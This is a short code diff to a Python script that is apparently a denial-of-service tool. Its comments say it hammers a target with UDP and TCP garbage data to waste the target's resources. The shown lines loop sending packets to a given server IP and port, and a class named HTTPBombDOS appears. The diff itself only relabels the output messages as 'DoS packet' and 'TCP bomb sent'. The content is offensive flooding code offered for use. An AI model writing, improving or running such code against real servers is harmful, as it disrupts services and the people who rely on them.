@@ -20,7 +20,7 @@ def main():
     # This will hammer the target with UPD and TCP garbage data
     # and will waste most of the targets resources
     for i in range(args.count):
-        print(f"[{i + 1}/{args.count}] Sending UDP packet...")
+        print(f"[{i + 1}/{args.count}] Sending DoS packet...")
         sock.sendto(message, (args.server_ip, args.server_port))
         client.send("/")
         
@@ -55,8 +55,7 @@ class HTTPBombDOS:
 
         response = self.sock.recv(4096)
 
-        print("Server response:")
-        print(response.decode(errors="ignore"))
+        print("TCP bomb sent.")
 
         self.sock.sendall(response)
 
